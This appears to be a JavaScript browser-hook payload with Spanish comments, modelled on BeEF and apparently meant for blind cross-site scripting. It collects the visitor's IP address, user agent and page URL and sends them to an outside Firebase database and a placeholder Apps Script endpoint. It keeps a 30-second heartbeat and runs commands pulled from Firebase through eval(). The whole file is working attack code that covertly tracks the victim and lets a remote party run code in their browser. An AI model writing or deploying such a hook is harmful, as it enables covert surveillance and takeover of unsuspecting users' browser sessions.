// Configuración
const FIREBASE_URL = "https://bdblindxss-default-rtdb.firebaseio.com/";
const APPS_SCRIPT_URL = "TU_URL_DE_APPS_SCRIPT";

// Generar ID único
const hookId = 'hook_' + Math.random().toString(36).substr(2, 9);

// Registrar hook
function registerHook() {
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(({ip}) => {
      const hookData = {
        id: hookId,
        ip: ip,
        userAgent: navigator.userAgent,
        url: window.location.href,
        firstSeen: new Date().toISOString(),
        lastActive: new Date().toISOString()
      };
      
      // Enviar a Firebase directamente
      fetch(`${FIREBASE_URL}/beef_hooks/${hookId}.json`, {
        method: 'PUT',
        body: JSON.stringify(hookData)
      });
      
      // Enviar también a Apps Script como backup
      fetch(`${APPS_SCRIPT_URL}?key=TU_CLAVE_SECRETA&hookData=${encodeURIComponent(JSON.stringify(hookData))}`);
    });
}

// Heartbeat cada 30 segundos
setInterval(() => {
  const update = { lastActive: new Date().toISOString() };
  fetch(`${FIREBASE_URL}/beef_hooks/${hookId}/lastActive.json`, {
    method: 'PUT',
    body: JSON.stringify(update.lastActive)
  });
}, 30000);

// Escuchar comandos
function listenCommands() {
  const commandRef = firebase.database().ref(`beef_commands`).orderByChild('hookId').equalTo(hookId);
  commandRef.on('child_added', (snapshot) => {
    const cmd = snapshot.val();
    if (cmd.status === 'pending') {
      try {
        eval(cmd.instruction);
        // Marcar como ejecutado
        snapshot.ref.update({ status: 'executed' });
      } catch (e) {
        snapshot.ref.update({ status: 'failed', error: e.message });
      }
    }
  });
}

// Inicialización
if (!localStorage.getItem('beef_hook')) {
  localStorage.setItem('beef_hook', hookId);
  registerHook();
  listenCommands();
}